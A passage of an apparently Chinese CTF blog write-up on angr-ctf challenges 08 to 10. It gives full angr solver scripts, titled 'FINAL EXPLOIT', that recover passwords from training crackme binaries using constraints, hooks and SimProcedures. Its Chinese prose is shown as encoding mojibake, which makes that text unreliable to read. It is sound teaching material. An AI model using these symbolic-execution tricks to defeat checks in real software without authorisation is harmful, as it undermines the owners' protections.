angr-ctfï¼šçº¦æŸæ¡ä»¶"></a>0x03. angr-ctfï¼šçº¦æŸæ¡ä»¶</h1><h2 id="08-angr-constraintsï¼šæ·»åŠ çº¦æŸ"><a href="#08-angr-constraintsï¼šæ·»åŠ çº¦æŸ" class="headerlink" title="08_angr_constraintsï¼šæ·»åŠ çº¦æŸ"></a>08_angr_constraintsï¼šæ·»åŠ çº¦æŸ</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œè¿˜æ˜¯è¯»å…¥è¾“å…¥å complex å‡½æ•°å¤„ç†åè¿›è¡Œæ¯”å¯¹çš„æ¨¡å¼ï¼Œè¿™é‡Œçš„ <code>0x804C040</code> å°±æ˜¯ <code>buffer</code> çš„åœ°å€ï¼Œä¸è¿‡å…¶è‡ªå®šä¹‰äº†ä¸€ä¸ªå¯¹æ¯”å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/4DXMH3GIQdiZOwC.png" alt="image.png"></p><p>è‡ªå®šä¹‰çš„å¯¹æ¯”å‡½æ•°æ¯”è¾ƒå¸¸è§„ï¼Œå…¶ä¸­çš„ <code>0x804C030</code> ä¾¿æ˜¯ <code>password</code> çš„åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2022/10/31/sxXtqvHYyiN5COg.png" alt="image.png"></p><p>åœ¨ <code>check_equals_xx()</code> å‡½æ•°å½“ä¸­ç”±äºå…¶é€‰æ‹©äº†é€å­—ç¬¦æ¯”è¾ƒåå¢åŠ è®¡æ•°çš„æ¯”è¾ƒæ–¹å¼çš„ç¼˜æ•…ï¼Œä¼šå¯¼è‡´ <strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼ˆpath explosionï¼‰çš„é—®é¢˜</p><h3 id="angr-ä¸­çš„çº¦æŸ"><a href="#angr-ä¸­çš„çº¦æŸ" class="headerlink" title="angr ä¸­çš„çº¦æŸ"></a>angr ä¸­çš„çº¦æŸ</h3><p>å‰é¢æˆ‘ä»¬è®²åˆ°ä½å‘é‡ä¹‹é—´å¯ä»¥è¿›è¡Œè¿ç®—ï¼Œç±»ä¼¼åœ°ï¼Œä½å‘é‡ä¹‹é—´ä¹Ÿå¯ä»¥è¿›è¡Œ<strong>æ¯”è¾ƒè¿ç®—</strong> ï¼Œå…¶ç»“æœä¸º <code>Bool</code> ç±»å‹çš„å¯¹è±¡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv == bvv2<br>&lt;Bool <span class="hljs-literal">True</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs == bvv + bvv2<br>&lt;Bool bvs_0_32 == <span class="hljs-number">0xbd5b7dde</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&#x27;bvs2&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 &gt; bvs * bvv + bvv2<br>&lt;Bool bvs2_1_32 &gt; bvs_0_32 * <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>å¯¹äºå¸¦æœ‰ç¬¦å·å€¼çš„æ¯”è¾ƒè€Œè¨€ï¼Œ <code>Bool</code> ç±»å‹çš„å¯¹è±¡ç›´æ¥è¡¨ç¤ºäº†å¯¹åº”çš„å¼å­ï¼Œå› æ­¤å¯ä»¥ä½œä¸º<strong>çº¦æŸæ¡ä»¶</strong>è¢«æ·»åŠ åˆ°ä¸€ä¸ªçŠ¶æ€å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>state.solver.add()</code> ä¸ºå¯¹åº”çŠ¶æ€æ·»åŠ çº¦æŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs == bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs2 &gt; bvs * bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.<span class="hljs-built_in">eval</span>(bvs2) <span class="hljs-comment"># get the concrete value under constraints</span><br></code></pre></td></tr></table></figure><p>é™¤äº† Bool ç±»ä»¥å¤–ï¼ŒClaripy è¿˜æä¾›äº†ä¸€äº›ä»¥ä½å‘é‡ä½œä¸ºç»“æœçš„è¿ç®—æ“ä½œï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªğŸŒ°ï¼ˆå®Œæ•´çš„è¿˜æ˜¯å»è¯»<a href="https://docs.angr.io/advanced-topics/claripy">æ–‡æ¡£</a>å§ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>claripy.If(bvs == bvs2, bvs, bvs2)<br>&lt;BV32 <span class="hljs-keyword">if</span> bvs_0_32 == bvs2_1_32 then bvs_0_32 <span class="hljs-keyword">else</span> bvs2_1_32&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-4"><a href="#FINAL-EXPLOIT-4" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>ç”±äºå¾…æ¯”è¾ƒå­—ç¬¦ä¸²æ˜¯å›ºå®šçš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥è®© <code>explore()</code> åœ¨å®Œæˆå¯¹è¾“å…¥çš„å˜æ¢åã€åœ¨è¿›å…¥æ¯”è¾ƒå‡½æ•°ä¹‹å‰åœä¸‹ï¼Œä¹‹åç›´æ¥ä¸ºè¯¥çŠ¶æ€æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªå¯¹åº”çš„çº¦æŸåè¿›è¡Œæ±‚è§£å³å¯</p><p>è¿™é‡Œæ·»åŠ çº¦æŸçš„æ–¹æ³•æ˜¯ä½¿ç”¨ <code>state.memory.load(addr, size_in_bytes)</code> æˆå‘˜å‡½æ•°å°†å½“å‰çŠ¶æ€çš„æŸä¸ªå†…å­˜åŒºåŸŸä½œä¸ºä¸€ä¸ª BVS æå–å‡ºæ¥ï¼Œä¹‹åé€šè¿‡ <code>state.add_constraints(condition)</code> æ·»åŠ çº¦æŸæŒ‡å®šè¯¥å—å†…å­˜åœ¨å½“å‰çŠ¶æ€ä¸‹çš„å€¼ä¸ºç‰¹å®šå­—ç¬¦ä¸²ï¼Œæœ€åä½¿ç”¨ <code>state.solver.eval()</code> æ±‚è§£åŸæ¥çš„ buffer å³å¯</p><p>æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼Œè¯¦è§æ³¨é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./08_angr_constraints&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_addr = <span class="hljs-number">0x804935D</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    <span class="hljs-comment"># BVS for buffer</span><br>    buffer_addr = <span class="hljs-number">0x804C040</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># explore to check_equals()</span><br>    check_addr = <span class="hljs-number">0x80493A9</span> <span class="hljs-comment"># last insn before call check_equals() </span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = check_addr)<br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># get the buffer BVS of check_state</span><br>    password = check_state.memory.load(buffer_addr, buffer_size)<br>    compared_str = <span class="hljs-string">&quot;EFJLFOGMURLEVNXN&quot;</span><br><br>    <span class="hljs-comment"># add and solve the constraints</span><br>    check_state.add_constraints(password == compared_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/01/Lh5YzU3RPyD2ZTW.png" alt="image.png"></p><h1 id="0x04-angr-ctfï¼šå‡½æ•°æ“ä½œ"><a href="#0x04-angr-ctfï¼šå‡½æ•°æ“ä½œ" class="headerlink" title="0x04. angr-ctfï¼šå‡½æ•°æ“ä½œ"></a>0x04. angr-ctfï¼šå‡½æ•°æ“ä½œ</h1><h2 id="09-angr-hooksï¼šå‡½æ•°æ›¿æ¢"><a href="#09-angr-hooksï¼šå‡½æ•°æ›¿æ¢" class="headerlink" title="09_angr_hooksï¼šå‡½æ•°æ›¿æ¢"></a>09_angr_hooksï¼šå‡½æ•°æ›¿æ¢</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDAï¼Œç¨‹åºå¤§æ¦‚çš„ä¸»ä½“é€»è¾‘æ˜¯è¯»å…¥ buffer åç»è¿‡ <code>complex_function()</code> è¿ç®—ï¼Œä¹‹åé€šè¿‡ <code>check_equals()</code> ä¸ password è¿›è¡Œå¯¹æ¯”å¹¶æŠŠç»“æœå­˜åˆ° <code>equals</code> å˜é‡å½“ä¸­ï¼›ä¹‹åå°† password ç»è¿‡ <code>complex_function()</code> è¿ç®—ï¼Œéšåå†è¯»å…¥ buffer ä¸ password è¿›è¡Œå¯¹æ¯”ï¼›ä¸¤ä¸ªæ¡ä»¶éƒ½ç¬¦åˆäº†æ‰ä¼šè¾“å‡º <code>&quot;Good Job.&quot;</code> </p><p>å…¶ä¸­ <code>0x804C044</code> å°±æ˜¯ buffer çš„åœ°å€ï¼Œ<code>0x804C034</code> å°±æ˜¯ password çš„åœ°å€</p><p><img src="https://s2.loli.net/2022/11/02/sIjxptNAr7ZCeuo.png" alt="image.png"></p><p>å…¶ä¸­ <code>check_equals()</code> é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå°±ç®—ç®€å•çš„ä¸ password è¿›è¡Œå¯¹æ¯”ï¼Œä¸è¿‡ç”±äºæ˜¯<strong>é€å­—ç¬¦å¯¹æ¯”</strong>åå¢åŠ ç»Ÿè®¡æ•°é‡ï¼Œå› æ­¤ä¼šå¯¼è‡´<strong>è·¯å¾„çˆ†ç‚¸</strong>ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/5NAMaSsoHVZ4geL.png" alt="image.png"></p><p>å¦‚æœæ˜¯åƒ 02 é‚£æ ·ç›´æ¥æ±‚è§£ï¼Œ<code>check_equals()</code> å¸¦æ¥çš„è·¯å¾„çˆ†ç‚¸ä¼šéå¸¸ä»¤äººå¤´å¤§ï¼Œè€Œè¯¥å‡½æ•°çš„åŠŸèƒ½æœ¬è´¨ä¸Šå°±ä»…æ˜¯ä¸ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥<strong>ä½¿ç”¨ angr æ¥ hook æ‰è¯¥å‡½æ•°ï¼Œè‡ªè¡Œå®ç°ç­‰ä»·çš„æ“ä½œå‡½æ•°</strong></p><h3 id="project-hook-å‡½æ•°é’©å­"><a href="#project-hook-å‡½æ•°é’©å­" class="headerlink" title="project.hook() - å‡½æ•°é’©å­"></a>project.hook() - å‡½æ•°é’©å­</h3><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬ä¼šæœ‰éœ€è¦ hook æ‰æŸä¸ªå‡½æ•°çš„éœ€æ±‚ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>project.hook(addr = call_insn_addr, hook = my_function, length = n)</code> æ¥ hook æ‰å¯¹åº”çš„ call æŒ‡ä»¤ï¼Œå…¶ä¸­ <code>call_insn_addr</code> ä¸º call æŒ‡ä»¤çš„åœ°å€ï¼Œ<code>my_function</code> ä¸ºæˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°ï¼Œ <code>length</code> ä¸º call æŒ‡ä»¤çš„é•¿åº¦ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/Y5ptBU8oAsTdj7c.png" alt="image.png"></p><p>æˆ‘ä»¬çš„è‡ªå®šä¹‰å‡½æ•°åº”å½“ä¸ºæ¥æ”¶ <code>state</code> ä½œä¸ºå‚æ•°çš„å‡½æ•°ï¼Œangr è¿˜æä¾›äº† decorator è¯­æ³•ç³–ï¼Œå› æ­¤ä»¥ä¸‹ä¸¤ç§å†™æ³•éƒ½å¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># method 1</span><br><span class="hljs-meta">@project.hook(<span class="hljs-params"><span class="hljs-number">0x1234</span>, length=<span class="hljs-number">5</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br><br><span class="hljs-comment"># method 2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func2</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-comment"># do something, this is an example</span><br>    state.regs.eax = <span class="hljs-number">0xdeadbeef</span><br>proj.hook(addr = <span class="hljs-number">0x5678</span>, hook = my_hook_func2, length = <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-5"><a href="#FINAL-EXPLOIT-5" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>å› æ­¤æœ¬é¢˜æˆ‘ä»¬åªéœ€è¦ hook æ‰æ¯”è¾ƒå‡½æ•°ä¾¿èƒ½è§£å†³è·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>claripy.If()</code> åˆ›å»ºä¸€ä¸ªæ¯”è¾ƒå¹¶å°†å€¼ç»™åˆ° eax å¯„å­˜å™¨ä½œä¸ºè¿”å›å€¼ï¼Œæœ€åå°±æ˜¯å¸¸è§„çš„å†…å­˜ç¬¦å·åŒ–åæ±‚è§£å³å¯ï¼Œæœ€ç»ˆçš„æ±‚è§£è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    start_addr = <span class="hljs-number">0x804937D</span> <span class="hljs-comment"># first insn after first scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># because we have passed the qmemcpy() that initial the password&#x27;s memory,</span><br>    <span class="hljs-comment"># so we need to do it manually</span><br>    password_size = <span class="hljs-number">0x10</span><br>    password_addr = <span class="hljs-number">0x804C034</span><br>    init_state.memory.store(password_addr,<br>                            claripy.BVV(<span class="hljs-built_in">int</span>.from_bytes(compared_str, <span class="hljs-string">&quot;big&quot;</span>), <br>                                        password_size * <span class="hljs-number">8</span>))<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># eax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x80493D3</span>) <span class="hljs-comment"># first insn after my_hook_func() returned</span><br><br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br>    check_state.add_constraints(check_state.regs.eax == <span class="hljs-number">1</span>) <span class="hljs-comment"># constraint for eval == 1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password0: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state.solver.<span class="hljs-built_in">eval</span>(buffer, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br>    <span class="hljs-comment"># now we need to calculate the password&#x27;s val after complex()</span><br>    simgr2 = proj.factory.simgr(check_state)<br>    simgr2.explore(find = <span class="hljs-number">0x8049428</span>) <span class="hljs-comment"># last insn before second scanf()</span><br><br>    check_state2 = simgr2.found[<span class="hljs-number">0</span>]<br>    password = check_state2.memory.load(password_addr, password_size)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;password1: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(check_state2.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>è¿˜æ˜¯ç§’è§£ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/xHpXA6WNqwisaLT.png" alt="image.png"></p><blockquote><p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§æ›´åŠ ç®€æ´çš„å†™æ³•å°±æ˜¯ hook æ‰ <code>check_equals()</code> ä¹‹åç›´æ¥ä» <code>entry_state</code> å¼€å§‹ explore() åˆ°è¾“å‡º <code>&quot;Good Job.&quot;</code> ï¼Œä½†ç¬”è€…åœ¨åˆšå¼€å§‹å†™çš„æ—¶å€™æ˜¯æ²¡æƒ³åˆ°çš„â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./09_angr_hooks&#x27;</span><br>    proj = angr.Project(bin_path)<br><br>    buffer_addr = <span class="hljs-number">0x804C044</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    compared_str = <span class="hljs-string">b&#x27;XFQUUEQFKBECVEJF&#x27;</span><br><br>    init_state = proj.factory.entry_state()<br><br><span class="hljs-meta">    @proj.hook(<span class="hljs-params">addr = <span class="hljs-number">0x80493CE</span>, length = <span class="hljs-number">5</span></span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_hook_func</span>(<span class="hljs-params">state</span>):<br>        buffer = state.memory.load(buffer_addr, buffer_size)<br>        <span class="hljs-comment"># rax is used for return val</span><br>        state.regs.eax = claripy.If(buffer == compared_str, <span class="hljs-comment"># constraint</span><br>                                    <span class="hljs-comment"># if success, return 1, else return 0</span><br>                                    claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>))<br><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure></blockquote><h2 id="10-angr-simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨"><a href="#10-angr-simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨" class="headerlink" title="10_angr_simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨"></a>10_angr_simproceduresï¼šæ¨¡æ‹Ÿè¿‡ç¨‹è°ƒç”¨</h2><p>æƒ¯ä¾‹æ‹–å…¥ IDA ï¼Œè¿™ä¸€æ¬¡çš„ä¼ªä»£ç è¿˜æ˜¯ä¸€å¨å²æ‰€ä»¥ç›´æ¥çœ‹æ±‡ç¼–ï¼Œå¯ä»¥çœ‹åˆ°è™½ç„¶è¿˜æ˜¯æƒ¯ä¾‹çš„ <code>complex_function()</code> å¯¹è¾“å…¥è¿›è¡Œå¤„ç†åä½¿ç”¨ <code>check_equals()</code> è¿›è¡Œè·¯å¾„çˆ†ç‚¸çš„é€å­—ç¬¦æ¯”è¾ƒï¼Œä½†ä¸åŒçš„æ˜¯è¿™ä¸€æ¬¡å¤šäº†è®¸å¤šçš„ä¼ªè·¯å¾„ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/rj5ThAGsOeql9FP.png" alt="image.png"></p><p>è€Œæ¯ä¸ªä¼ªè·¯å¾„åé¢éƒ½å¯¹åº”ç€ä¸€ä¸ªè·¯å¾„çˆ†ç‚¸çš„ <code>check_equals()</code> ï¼š</p><p><img src="https://s2.loli.net/2022/11/02/pLiH6FYE1DJfrc9.png" alt="image.png"></p><p>å¦‚æœæˆ‘ä»¬å¯¹äºæ¯ä¸ªä¼ªè·¯å¾„åè¾¹çš„åŸºæœ¬å—éƒ½æ‰‹åŠ¨è¿›è¡Œ hookï¼Œé‚£æœªå…ä¹Ÿè¿‡äºéº»çƒ¦ï¼Œå› æ­¤è¿™ä¸€æ¬¡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ angr ç›´æ¥é€šè¿‡å‡½æ•°ç¬¦å·æ¥ hook æ‰ <code>check_equals()</code> å‡½æ•°</p><h3 id="angr-SimProcedure-æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰"><a href="#angr-SimProcedure-æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰" class="headerlink" title="angr.SimProcedure - æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰"></a>angr.SimProcedure - æ¨¡æ‹Ÿå‡½æ•°ï¼ˆè¿‡ç¨‹ï¼‰</h3><p>åœ¨ angr ä¸­ <code>angr.SimProcedure</code> ç±»ç”¨æ¥è¡¨ç¤º<strong>åœ¨ä¸€ä¸ªçŠ¶æ€ä¸Šçš„ä¸€ä¸ªè¿è¡Œè¿‡ç¨‹</strong>â€”â€”å³å‡½æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ª SimPrecedure</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª <code>angr.SimProcedure</code> çš„ç±»å¹¶é‡å†™ <code>run()</code> æ–¹æ³•çš„æ–¹å¼æ¥è¡¨ç¤ºä¸€ä¸ªè‡ªå®šä¹‰å‡½æ•°ï¼Œå…¶ä¸­ <code>run()</code> æ–¹æ³•çš„å‚æ•°ä¸ºè¯¥å‡½æ•°æ‰€æ¥æ”¶çš„å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyProcedure</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, arg1, arg2</span>):<br>        <span class="hljs-comment"># do something, this&#x27;s an example</span><br>        <span class="hljs-keyword">return</span> self.state.memory.load(arg1, arg2)<br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰å‡½æ•°è¿‡ç¨‹ä¸»è¦ç”¨äºå¯¹æ–‡ä»¶ä¸­çš„åŸæœ‰å‡½æ•°è¿›è¡Œæ›¿æ¢ï¼Œä¾‹å¦‚ angr ç¼ºçœä¼šç”¨å†…ç½®çš„ä¸€äº› SimProcedure 